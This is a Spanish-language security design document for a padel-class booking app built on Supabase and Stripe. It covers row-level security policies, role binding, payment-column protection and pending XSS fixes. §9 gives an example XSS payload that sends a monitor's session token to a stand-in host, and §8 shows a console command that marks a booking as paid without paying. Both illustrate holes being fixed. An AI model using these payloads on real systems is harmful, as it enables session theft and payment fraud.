# Seguridad y roles — Cambios pendientes

> **Estado actual (18-jul-2026): RLS ACTIVADA en todas las tablas** con
> `rls_activacion_final.sql` (un único script idempotente que reemplaza a los pasos sueltos).
> Cubre también `class_requests` y `notifications` (que nunca habían tenido políticas): el
> alumno ya **no** puede marcarse `confirmada_pagada` desde la consola (§7 resuelto) — las
> transiciones de pago son solo del servidor (`service_role`). Lo que rompió el intento
> anterior está mitigado: el script **aborta** si algún `personal` no tiene `auth_user_id`
> enlazado, y los datos que cada rol necesita ver de otros salen de vistas roster no sensibles
> (`students_roster`, `personal_roster`, `class_holds`), fusionadas en `db.js`
> (`getPersonal`, `getActiveHolds`, `db.js?v=37`).
>
> **Sigue pendiente de este documento:** autenticar los endpoints de `functions/api`
> (hoy no verifican el JWT: aceptan `studentId`/`monitorId` del body), el XSS de §9,
> y la limpieza de login duplicado (§ problemas 5-6).
>
> **⚠️ Síntoma clave detectado:** si una cuenta actúa como un monitor cuya fila en `personal`
> **no tiene `auth_user_id`** enlazado al usuario de Auth con el que se ha hecho login, entonces
> `current_monitor_id()` devuelve NULL y **RLS le deniega escribir** (crear/editar clases). La app
> lo captura y guarda **solo en localStorage**, mostrando el toast naranja
> *"Clase actualizada localmente (sin conexión)"* — el cambio **no llega a Supabase** y los demás
> (p. ej. el alumno) nunca lo ven. **Pendiente obligatorio antes de reactivar RLS:** enlazar cada
> monitor con su usuario de Auth (`UPDATE personal SET auth_user_id = '<uuid>' WHERE id = '<monitor_id>';`,
> ver §2.1) y cada alumno con acceso (§6).
>
> **▶ Para activarlo sin romper nada, sigue el runbook por fases:** `ACTIVAR_RLS_CHECKLIST.md`
> (no ejecutes este documento entero de golpe; es referencia, no un script).

---

## 1. Problemas que esto resuelve

| # | Problema actual | Riesgo |
|---|---|---|
| 1 | La pantalla de selección de rol (`#loginScreen` en `index.html`) deja a cualquiera entrar como coordinador o como cualquier monitor | Cualquier usuario autenticado ve y edita todo |
| 2 | El rol se guarda en `localStorage` (`padelApp_currentUser`), editable desde la consola del navegador | Escalada de rol trivial |
| 3 | RLS deshabilitado (ver `SETUP_SUPABASE.md`) + `anonKey` pública en el repositorio | Cualquiera con la URL y la key puede leer/escribir la base de datos **sin pasar por la app** |
| 4 | Los monitores no están vinculados a usuarios de Supabase Auth (`personal.id` es un id generado en el cliente) | Imposible escribir políticas RLS por usuario |
| 5 | Código de login duplicado: `db.js:392-445` define un segundo `handleLogin()`, `mostrarApp()` y `checkSession()` que pisan/duplican los de `app.js` | Comportamiento impredecible al cambiar el flujo de login |
| 6 | Credenciales duplicadas: `config.js` (no se carga en `index.html`) y `supabase-init.js` (el que se usa de verdad) | Confusión al rotar claves |
| 7 | Varias funciones de render meten datos escritos por usuarios (nombres, email, comentarios…) en `innerHTML` **sin escapar** (ver §9) | **XSS**: robo del token de sesión de `localStorage`, suplantación y acciones en nombre de la víctima |

---

## 2. Cambios en Supabase (SQL)

### 2.1 Vincular monitores a usuarios de Auth

```sql
-- Columna que enlaza cada monitor con su usuario de Supabase Auth
ALTER TABLE personal
    ADD COLUMN auth_user_id uuid UNIQUE REFERENCES auth.users(id);

-- El rol vive en la base de datos, nunca en el cliente
-- (la columna role ya existe: 'monitor' | 'coordinador')
```

Después, para cada monitor/coordinador real:
1. Crear su usuario en **Authentication → Users** (email + contraseña o invitación).
2. Copiar el UUID del usuario y asignarlo: `UPDATE personal SET auth_user_id = '<uuid>' WHERE id = '<monitor_id>';`

### 2.2 Función auxiliar para las políticas

```sql
-- Devuelve el rol del usuario autenticado consultando personal
CREATE OR REPLACE FUNCTION public.current_role()
RETURNS text
LANGUAGE sql STABLE SECURITY DEFINER
AS $$
    SELECT role FROM public.personal WHERE auth_user_id = auth.uid();
$$;

-- Devuelve el id de monitor del usuario autenticado
CREATE OR REPLACE FUNCTION public.current_monitor_id()
RETURNS uuid
LANGUAGE sql STABLE SECURITY DEFINER
AS $$
    SELECT id FROM public.personal WHERE auth_user_id = auth.uid();
$$;
```

> Nota: si `personal.id` no es de tipo `uuid` real (hoy la app genera ids tipo `_abc123` con
> `generateId()` en `app.js:115`), cambiar el tipo de retorno a `text` o migrar los ids a UUID
> con `crypto.randomUUID()` en el cliente. **Recomendado: migrar a UUID.**

### 2.3 Activar RLS y políticas

```sql
ALTER TABLE personal ENABLE ROW LEVEL SECURITY;
ALTER TABLE students ENABLE ROW LEVEL SECURITY;
ALTER TABLE classes  ENABLE ROW LEVEL SECURITY;

-- ---------- MONITORS ----------
-- Todos los autenticados pueden ver la lista de monitores (necesario para la UI)
CREATE POLICY monitors_select ON personal
    FOR SELECT TO authenticated USING (true);

-- Solo el coordinador crea/edita/borra monitores
CREATE POLICY monitors_write ON personal
    FOR ALL TO authenticated
    USING (public.current_role() = 'coordinador')
    WITH CHECK (public.current_role() = 'coordinador');

-- ---------- STUDENTS ----------
-- ⚠️ SUPERSEDED: este `USING (true)` dejaba a cualquier alumno leer email/teléfono
-- de todos. El modelo REAL vive en `students_privacy.sql` (✅ implementado): el alumno
-- solo lee su propia fila; los demás, nombre/nivel vía la vista `students_roster`.
CREATE POLICY students_select ON students
    FOR SELECT TO authenticated USING (true);

CREATE POLICY students_write ON students
    FOR ALL TO authenticated
    USING (public.current_role() IN ('coordinador', 'monitor'))
    WITH CHECK (public.current_role() IN ('coordinador', 'monitor'));

-- ---------- CLASSES ----------
-- El coordinador ve todas; el monitor solo las suyas
CREATE POLICY classes_select ON classes
    FOR SELECT TO authenticated
    USING (
        public.current_role() = 'coordinador'
        OR monitor_id = public.current_monitor_id()
    );

-- El monitor solo crea/edita/borra sus propias clases
CREATE POLICY classes_insert ON classes
    FOR INSERT TO authenticated
    WITH CHECK (
        public.current_role() = 'coordinador'
        OR monitor_id = public.current_monitor_id()
    );

CREATE POLICY classes_update ON classes
    FOR UPDATE TO authenticated
    USING (
        public.current_role() = 'coordinador'
        OR monitor_id = public.current_monitor_id()
    )
    WITH CHECK (
        public.current_role() = 'coordinador'
        OR monitor_id = public.current_monitor_id()
    );

CREATE POLICY classes_delete ON classes
    FOR DELETE TO authenticated
    USING (
        public.current_role() = 'coordinador'
        OR monitor_id = public.current_monitor_id()
    );
```

### 2.4 Proteger el campo de pagos

El campo `classes.paid` lo marca **solo el coordinador**. Con las políticas de arriba un monitor
podría marcar como pagadas sus propias clases. Para impedirlo, usar un trigger:

```sql
CREATE OR REPLACE FUNCTION public.protect_paid_column()
RETURNS trigger LANGUAGE plpgsql SECURITY DEFINER AS $$
BEGIN
    IF NEW.paid IS DISTINCT FROM OLD.paid
       AND public.current_role() <> 'coordinador' THEN
        RAISE EXCEPTION 'Solo el coordinador puede modificar el estado de pago';
    END IF;
    RETURN NEW;
END;
$$;

CREATE TRIGGER trg_protect_paid
    BEFORE UPDATE ON classes
    FOR EACH ROW EXECUTE FUNCTION public.protect_paid_column();
```

### 2.5 Rotar la clave anónima

La `anonKey` actual está en el historial de git (en `config.js` y `supabase-init.js`). Con RLS
activado el daño es limitado, pero conviene rotarla igualmente:
**Settings → API → "Roll anon key"** en el panel de Supabase, y actualizarla en `supabase-init.js`.

---

## 3. Cambios en el frontend

### 3.1 `index.html`
- **Eliminar** la pantalla de selección de rol completa (`<div class="login-screen" id="loginScreen">`,
  líneas con las dos `role-card`).
- **Eliminar** el modal "Ingresar como Monitor" (`#monitorLoginModal`): un monitor ya no se elige,
  viene determinado por su usuario.

### 3.2 `app.js`
- En `handleLogin()` (tras `signInWithPassword`): buscar el monitor del usuario autenticado y
  asignar el rol desde la base de datos:
  ```js
  const { data: { user } } = await supabase.auth.getUser();
  const { data: monitor } = await supabase
      .from('personal')
      .select('*')
      .eq('auth_user_id', user.id)
      .single();
  if (!monitor) { /* usuario sin perfil: mostrar error y signOut */ }
  appState.currentUser = {
      id: monitor.id,
      name: monitor.name,
      role: monitor.role === 'coordinador' ? 'coordinator' : 'monitor',
  };
  ```
- **Eliminar** `login(role)`, `showMonitorLogin()`, `handleMonitorLogin()` y la persistencia del
  rol en `localStorage` (`padelApp_currentUser` solo como caché de UI, nunca como fuente del rol;
  ideal: eliminarla y derivar siempre de la sesión).
- En `initializeApp()`: si hay sesión, repetir la consulta del monitor (no leer el rol de
  `localStorage`) y llamar directamente a `showMainApp()`.
- Sustituir `generateId()` por `crypto.randomUUID()` para que los ids sean UUID reales.

### 3.3 `db.js`
- ~~**Eliminar** el bloque duplicado (`currentUser`, `handleLogin`, `mostrarApp`,
  `checkSession`): toda la lógica de sesión debe vivir solo en `app.js`.~~ ✅ **Hecho** (jun 2026):
  el bloque se eliminó al corregir el error "Invalid Refresh Token" que provocaba la doble
  comprobación de sesión al cargar la página.

### 3.4 Limpieza de configuración
- Dejar **una sola** fuente de credenciales (`supabase-init.js`, que es el que carga `index.html`)
  y borrar `config.js`, o al revés, pero no las dos.
- Borrar archivos muertos: `app_backup.js`, `app_supabase.js`, `migrate.html`.

---

## 4. Checklist de verificación (cuando se active)

- [ ] Un usuario monitor inicia sesión y **solo** ve su propio calendario.
- [ ] Un monitor no puede ver el panel de coordinador (ni siquiera manipulando `localStorage`).
- [ ] Un monitor no puede leer clases de otro monitor desde la consola
      (`supabase.from('classes').select('*')` debe devolver solo las suyas).
- [ ] Un monitor no puede cambiar `paid` (el trigger lo rechaza).
- [ ] El coordinador ve todos los monitores, todas las clases y puede marcar pagos.
- [ ] Un usuario de Auth sin fila en `personal` no puede entrar (mensaje claro + signOut).
- [ ] La `anonKey` antigua ya no funciona (rotada).
- [ ] Sin sesión, `select` sobre cualquier tabla devuelve 0 filas / error de permiso.

---

## 5. Pagos de alumnos (`student_payments`) — ✅ IMPLEMENTADO

> **Estado (jul 2026):** la tabla `student_payments` ya existe y está en uso (cobro
> a alumnos, distinto del pago a monitores que se marca con `classes.paid`). CRUD en
> `db.js` (`getPaymentsByStudent`, `getAllPayments`, `createPayment`, `updatePayment`,
> `convertPaymentFromDB`), UI en Recepción (pestaña Pagos) y en el panel del alumno.
> El bloque de abajo es el diseño de referencia original.

Diseño de referencia (crear la tabla con RLS desde el primer día):

```sql
CREATE TABLE student_payments (
    id          uuid PRIMARY KEY DEFAULT gen_random_uuid(),
    student_id  uuid REFERENCES students(id) NOT NULL,
    class_id    uuid REFERENCES classes(id),   -- null si es cuota mensual
    period      text NOT NULL,                 -- 'YYYY-MM'
    amount      numeric(8,2),
    paid_date   date,
    method      text,                          -- efectivo / bizum / transferencia
    created_at  timestamptz DEFAULT now()
);

ALTER TABLE student_payments ENABLE ROW LEVEL SECURITY;

-- Solo el coordinador gestiona cobros de alumnos
CREATE POLICY student_payments_all ON student_payments
    FOR ALL TO authenticated
    USING (public.current_role() = 'coordinador')
    WITH CHECK (public.current_role() = 'coordinador');
```

Recordatorio (CLAUDE.md): al crear esta tabla, añadir la conversión camelCase ↔ snake_case en
`db.js` y documentar el modelo en `CLAUDE.md`.

---

## 6. Rol de alumno (`usuario`) — ✅ IMPLEMENTADO (jul 2026)

El alumno tiene acceso propio a la app. **No** es un valor del array
`personal.permissions`: se deduce en el login (`resolveUserFromAuth` en `app.js`)
cuando el usuario autenticado **no** tiene fila en `personal` pero **sí** en
`students` (enlazada por `students.auth_user_id`). Entonces
`currentUser.permissions = ['usuario']` y se muestra el panel del alumno
(`showStudentView` / `renderStudentDashboard`).

**Migración:** `student_role.sql` (en la raíz del proyecto) añade
`students.auth_user_id`, crea la tabla `student_recoveries` (clases por recuperar,
que genera el monitor con `markAbsence`) y define funciones y políticas RLS para
que el alumno solo lea SUS pagos/recuperaciones y las clases futuras no cerradas
(para los avisos). El script es autocontenido (repite `current_monitor_id()` e
`is_coordinator()` de `rls_security_por_rol.sql`).

**Cómo dar acceso a un alumno:**
1. Crear su usuario en **Authentication → Users** (email + contraseña).
2. Enlazarlo: `UPDATE students SET auth_user_id = '<uuid>' WHERE id = '<student_id>';`

**⚠️ Regla: una cuenta de Auth = un solo rol.** No enlaces el mismo usuario de Auth
a la vez como personal (fila en `personal`) y como alumno (`students.auth_user_id`),
ni metas `'usuario'` en `personal.permissions`. Si una cuenta acumula varios roles,
`showMainApp` da **prioridad al personal** (coordinador → recepción → monitor →
alumno), pero el dato queda ambiguo. Diagnóstico rápido:
```sql
-- ¿algún usuario es personal Y alumno a la vez?
SELECT s.id, s.name FROM students s
JOIN personal m ON m.auth_user_id = s.auth_user_id;
-- ¿algún monitor tiene 'usuario' colado en permisos?
SELECT id, name, permissions FROM personal WHERE 'usuario' = ANY(permissions);
```

**Bloqueo por impago:** al entrar, si el alumno tiene una cuota mensual sin pagar de
un mes anterior (o del mes actual pasado el día 5), ve una pantalla de bloqueo en
vez del panel (`findBlockingUnpaidQuota` en `app.js`).

---

## 7. Solicitudes de inscripción + notificaciones — RLS PENDIENTE

`class_requests.sql` crea `class_requests` y `notifications` con **RLS deshabilitado**
("modo simple", igual que el resto). **Son las dos únicas tablas del proyecto que siguen
sin RLS.** Al activarla hay que añadir políticas (hoy la validación de
nivel/aforo/duplicados vive solo en el cliente, `app.js`).

> **⚠️ Ojo: `FOR ALL` no vale aquí.** El borrador anterior de esta sección usaba
> `FOR ALL` en las dos tablas y estaba **mal** por dos motivos reales (comprobados
> contra el código actual). Las políticas correctas van separadas por operación:

### 7.1 `class_requests` (solicitudes con estado de pago)

`class_requests` **ya no es solo una solicitud**: tras `stripe_payments.sql` guarda el
estado del cobro (`status`, `price`, `paid_at`, `stripe_session_id`, `payment_expires_at`,
`checkout_url`). Por eso el alumno **no puede tener UPDATE** (si no, se cuela en la clase
sin pagar poniéndose `status='confirmada_pagada'` desde la consola — es el agujero del §8.1).
Reparto real de escrituras hoy:

- **Alumno** → solo `INSERT` de solicitudes `pendiente` ([db.js](../db.js) `createRequest`) + `SELECT` de las suyas.
- **Monitor** → `UPDATE` de `status`/`reason` en las solicitudes de SUS clases, para rechazar
  ([db.js](../db.js) `updateRequestStatus`). Aceptar NO lo hace el cliente: lo hace el servidor.
- **Columnas de pago y transiciones de pago** (`aceptada_pendiente_pago`, `confirmada_pagada`,
  `cancelada_por_impago`) → solo la `service_role` (las Functions). Al saltarse RLS por completo,
  no necesitan política; basta con **no** dar UPDATE a alumno ni monitor sobre esas columnas.

```sql
ALTER TABLE class_requests ENABLE ROW LEVEL SECURITY;

-- Alumno: crea SOLO solicitudes 'pendiente' para sí mismo, y lee las suyas. NADA de UPDATE.
CREATE POLICY class_requests_student_insert ON class_requests
    FOR INSERT TO authenticated
    WITH CHECK (
        student_id = public.current_student_id()
        AND status = 'pendiente'
    );
CREATE POLICY class_requests_student_select ON class_requests
    FOR SELECT TO authenticated
    USING (student_id = public.current_student_id());

-- Monitor: lee las solicitudes de sus clases y solo puede rechazar/gestionar el estado.
CREATE POLICY class_requests_monitor_select ON class_requests
    FOR SELECT TO authenticated
    USING (public.is_coordinator() OR monitor_id = public.current_monitor_id());
CREATE POLICY class_requests_monitor_update ON class_requests
    FOR UPDATE TO authenticated
    USING (public.is_coordinator() OR monitor_id = public.current_monitor_id())
    WITH CHECK (public.is_coordinator() OR monitor_id = public.current_monitor_id());
```

> **Pendiente de decidir (endurecer el UPDATE del monitor):** la política de arriba deja al
> monitor cambiar cualquier columna de sus solicitudes, incluidas las de pago. Para que solo
> pueda tocar `status`/`reason` hace falta un **trigger** que rechace cambios en las columnas de
> pago si `current_monitor_id()` no es NULL (mismo patrón que `protect_paid_column()` del §2.4),
> ya que RLS no distingue por columna en un UPDATE. Alternativa más simple: que **también** el
> rechazo lo haga el servidor y quitarle el UPDATE al monitor del todo.

### 7.2 `notifications` (bus de avisos + Realtime)

El punto clave: **una notificación se dirige a OTRA persona**. El alumno inserta la notificación
cuyo `recipient_id` es el **monitor** ([app.js:5227](../app.js#L5227)), y el monitor al alumno al
resolver. Por eso una política `FOR ALL USING(recipient_id = yo)` **bloquearía el INSERT** (el
destinatario nunca soy yo) y **rompería los avisos en tiempo real**. Hay que separar el INSERT
(dirigido a otro) de la lectura/marcado (solo lo mío):

```sql
ALTER TABLE notifications ENABLE ROW LEVEL SECURITY;

-- INSERT: un autenticado puede crear una notificación dirigida a otro (alumno -> monitor y
-- viceversa). Nos apoyamos en que solo hay usuarios autenticados; el contenido no es sensible.
CREATE POLICY notifications_insert ON notifications
    FOR INSERT TO authenticated
    WITH CHECK ( true );

-- SELECT/UPDATE: cada quien solo ve y marca como leídas LAS SUYAS.
CREATE POLICY notifications_select ON notifications
    FOR SELECT TO authenticated
    USING (recipient_id = public.current_student_id()
        OR recipient_id = public.current_monitor_id());
CREATE POLICY notifications_update ON notifications
    FOR UPDATE TO authenticated
    USING (recipient_id = public.current_student_id()
        OR recipient_id = public.current_monitor_id())
    WITH CHECK (recipient_id = public.current_student_id()
        OR recipient_id = public.current_monitor_id());
```

> **Alternativa más estricta (recomendada a medio plazo):** mover la creación de notificaciones
> al **servidor** (`service_role`, como los pagos) y dejar `notifications` **sin** política de
> INSERT para clientes. Así un alumno no puede fabricar avisos falsos a nadie. Hoy `createNotification`
> vive en el cliente ([db.js](../db.js#L1317)); trasladarlo es el cambio pendiente.

**Nota Realtime:** ambas tablas están en la publicación `supabase_realtime`. Con RLS
activo, Supabase Realtime respeta las políticas (cada quien solo **recibe** sus filas por la
`notifications_select`), lo que refuerza el modelo. `subscribeToNotifications` filtra además por
`recipient_id` en el cliente.

---

## 8. Pagos con Stripe — lo que YA está protegido y lo que NO

**Implementado (jul 2026):** cobro de la plaza al aceptar el monitor una solicitud.
Código de servidor en `functions/` (Cloudflare Pages Functions), migración en
`stripe_payments.sql`. Hoy en **modo test** de Stripe: no se mueve dinero real.

### ✅ Lo que sí está bien protegido

- **La clave secreta de Stripe y la `service_role` de Supabase nunca llegan al navegador**:
  viven como variables de entorno de las Functions (`.dev.vars` en local, está en `.gitignore`;
  panel de Cloudflare en producción). El cliente solo conoce la `anonKey`, como hasta ahora.
- **El webhook verifica la firma de Stripe** (HMAC-SHA256 sobre el cuerpo crudo, con tolerancia
  de 5 min contra *replays*): nadie puede fingir un "pago confirmado" llamando al endpoint.
- **El importe lo fija el servidor** leyendo `classes.precio`; el cliente no lo envía, así que no
  puede manipularlo para pagar menos.
- **La confirmación del pago no depende del navegador**: la hace el webhook. Cerrar la pestaña
  tras pagar no deja la plaza sin confirmar.

### ⚠️ Lo que queda pendiente (consecuencia de tener RLS desactivada)

1. **`class_requests` sigue sin RLS, y ahora contiene el estado del pago.** Con la `anonKey`,
   cualquiera puede hacer desde la consola del navegador:
   ```js
   supabase.from('class_requests').update({ status: 'confirmada_pagada' }).eq('id', '<su-solicitud>')
   ```
   y colarse en la clase **sin pagar**. Es el mismo agujero que ya existía (§7), pero ahora tiene
   consecuencia económica. **Al activar RLS (§7), impedir además que el alumno escriba `status`,
   `price`, `paid_at` y `stripe_session_id`**: esas columnas solo debería tocarlas la `service_role`
   (las Functions). Lo más simple es que el alumno solo pueda INSERT de solicitudes `pendiente`
   y SELECT de las suyas, nunca UPDATE.

2. **`POST /api/checkout/create` no autentica al monitor.** No hay verificación de sesión en el
   servidor (la app no manda el JWT de Supabase Auth). Mitigación actual: el endpoint solo actúa
   sobre una solicitud que ya existe y esté `pendiente`, comprueba que el `monitorId` recibido es el
   monitor responsable de esa solicitud, y como mucho **genera un link de pago** (no inscribe a
   nadie ni cobra). **Solución prevista:** enviar el `access_token` de Supabase Auth en la cabecera
   `Authorization` y validarlo en la Function (`GET /auth/v1/user` con la anon key, o verificar el
   JWT), comprobando que el usuario autenticado es de verdad el monitor de la solicitud.

3. `/api/checkout/status` acepta cualquier `requestId`. Solo revela el estado de pago de una
   solicitud (información poco sensible) y **no puede confirmar nada que Stripe no confirme**, pero
   con el punto 2 resuelto conviene limitarlo también al alumno dueño de la solicitud.

4. **`POST /api/enrollment/leave` (baja del alumno) tampoco autentica** (Fase 2). Recibe
   `{ classId, studentId }` sin token, así que en teoría cualquiera podría dar de baja a otro alumno
   de una clase. Mitigación actual: solo saca de la clase a un `studentId` que **ya estaba inscrito**,
   respeta el corte de 24h, y como mucho libera una plaza (no cobra ni da acceso). El daño es un
   sabotaje puntual, no económico. **Solución prevista (misma que el punto 2):** validar el
   `access_token` de Supabase Auth y comprobar que el usuario autenticado es ese `studentId`.
   La escritura en `classes` y `student_recoveries` va por `service_role` (correcto: el alumno no
   tiene permiso directo por RLS).

**Checklist antes de pasar Stripe a modo LIVE (dinero real):**
- [ ] RLS activada en `class_requests` con las columnas de pago protegidas (punto 1). **Bloqueante.**
- [ ] `/api/checkout/create` **y** `/api/enrollment/leave` autenticados (puntos 2 y 4). **Bloqueante.**
- [ ] Webhook de producción dado de alta en el Dashboard de Stripe, con su `whsec_` propio
      (el de `stripe listen` solo vale en local).
- [ ] Claves `sk_live_…` en las variables de entorno de Cloudflare Pages, nunca en el repositorio.
- [ ] Decidida la política de precios (`MANTENIMIENTO.md` §10).

---

## 9. XSS: escapar los datos de usuario en el HTML — PENDIENTE

### Qué problema resuelve

La app construye casi toda la UI con `innerHTML` y **plantillas de texto** (``elem.innerHTML = `...${dato}...` ``).
`innerHTML` **interpreta lo que recibe como HTML**, así que cualquier dato que haya escrito
un usuario (nombre de alumno, email, teléfono, **comentarios de clase**, motivo de rechazo,
mensaje de notificación…) y se inserte **sin escapar** se ejecuta como código. Es un
**Cross-Site Scripting (XSS)**.

Ejemplo: un alumno pone como nombre
`<img src=x onerror="fetch('https://malo/?t='+localStorage.getItem('padel-auth'))">`.
Cuando el monitor abre su lista de alumnos (o le llega el toast de "nueva solicitud"), ese
código se ejecuta **en el navegador del monitor** y **roba su token de sesión** del
`localStorage`. Con el token, el atacante suplanta al monitor hasta que caduque.

Esto lo resuelve:
- **Robo del token de sesión** guardado en `localStorage` (el motivo por el que `localStorage`
  se considera "seguro solo si no hay XSS": esta es justo la parte del "si no hay XSS").
- **XSS almacenado entre usuarios** (el caso más grave): el dato malicioso se guarda en Supabase
  (nombre, `notifications.message`) y ataca a **quien lo vea después**, no solo a quien lo escribió.Usar textContent
- Suplantación y acciones en nombre de la víctima, inyección de UI falsa, etc. (un XSS no se
  limita a robar el token).

> **Nota:** esta capa es **complementaria** a RLS, no la sustituye. RLS limita **qué** puede hacer
> un token robado (un token de alumno no toca datos de monitor); escapar el HTML evita que **roben
> el token** en primer lugar. Hacen falta las dos.

### Ya existe la herramienta

`app.js:205` define `escapeHtml(value)` (convierte `& " ' < >` en entidades). El código nuevo
(torneos, panel del alumno, recepción, `showConfirm`/`showAlert`/`showPrompt`) **ya la usa
bien**. Solo falta aplicarla en las funciones de render antiguas y en `showToast`. La regla:

- **Texto de usuario que va a `innerHTML`** → envolver en `escapeHtml(...)`.
- Cuando solo se muestra texto (sin HTML alrededor), preferible construir el nodo y usar
  **`textContent`**, que nunca interpreta HTML.
- HTML que controlas al 100% (iconos, plantillas fijas) → se queda igual.

### Puntos a corregir

**🔴 Prioridad máxima — `showToast` (arregla muchos de golpe):**

- [app.js:4214](App_Reservas_Padel/app.js#L4214) — `showToast` inserta `${message}` en `innerHTML`
  **sin escapar**. Cambiar a `escapeHtml(message)` (o pintar el mensaje con `textContent`).
  Con este único cambio se cierra también el **XSS almacenado**: el toast de Realtime
  ([app.js:5518](App_Reservas_Padel/app.js#L5518)) muestra `notifications.message`, que se genera
  con el nombre del alumno ([app.js:5233](App_Reservas_Padel/app.js#L5233)) y viaja desde la BD.

**🟠 Funciones de render con datos de usuario sin escapar:**

| Ubicación | Dato sin escapar | Contexto |
|---|---|---|
| [app.js:1919](App_Reservas_Padel/app.js#L1919) | `student.name` | Cabecera de búsqueda de alumno |
| [app.js:1945](App_Reservas_Padel/app.js#L1945), [app.js:2074](App_Reservas_Padel/app.js#L2074) | `cls.monitorName` | Tarjetas de clase |
| [app.js:2485](App_Reservas_Padel/app.js#L2485), [app.js:2492](App_Reservas_Padel/app.js#L2492), [app.js:2493](App_Reservas_Padel/app.js#L2493) | `student.name` / `email` / `phone` | Tarjeta de alumno |
| [app.js:2913](App_Reservas_Padel/app.js#L2913) | `s.name` | Selector de alumnos (checkbox) |
| [app.js:3053](App_Reservas_Padel/app.js#L3053) | `s.name`, `s.email` | Desplegable de búsqueda |
| [app.js:3258](App_Reservas_Padel/app.js#L3258) | `s.name` | Lista de alumnos del monitor |
| [app.js:3273](App_Reservas_Padel/app.js#L3273), [app.js:3276](App_Reservas_Padel/app.js#L3276), [app.js:3283](App_Reservas_Padel/app.js#L3283) | `monitor.email` / `phone` / `name` | Tarjeta de monitor |
| [app.js:3724](App_Reservas_Padel/app.js#L3724) | `cls.comments` | Detalle de clase — **texto libre, riesgo alto** |
| [app.js:4478](App_Reservas_Padel/app.js#L4478) | `currentUser.name` | Badge de usuario (nombre propio, riesgo bajo) |

**✅ Ya correctos (referencia de cómo debe quedar):** todo `tournaments.js`
(`escapeHtml` en 268, 323, 489), `showConfirm`/`showAlert`/`showPrompt`
([app.js:4247](App_Reservas_Padel/app.js#L4247), 4273, 4302) y las funciones nuevas
(2606, 3701, 4630, 4958, 5026, 5060, 5076, 5595, 6029, 6036, 6578, 6605, 6720…).

**No aplica:** exportación a Excel ([app.js:7389](App_Reservas_Padel/app.js#L7389), 7484) — `xlsx`
no interpreta HTML. El `borrador/` (`app_backup.js`, `migrate.html`) es código muerto (borrar, §3.4).

### Checklist

- [ ] `showToast` escapa el mensaje (cierra el XSS almacenado vía notificaciones).
- [ ] Todas las filas de la tabla anterior usan `escapeHtml(...)` o `textContent`.
- [ ] Prueba: crear un alumno llamado `<img src=x onerror=alert(1)>`; ni su tarjeta, ni el toast
      de solicitud, ni el detalle de clase deben ejecutar el `alert`.
- [ ] Regla para el futuro: **cualquier dato de BD/usuario que entre en `innerHTML` va escapado**.
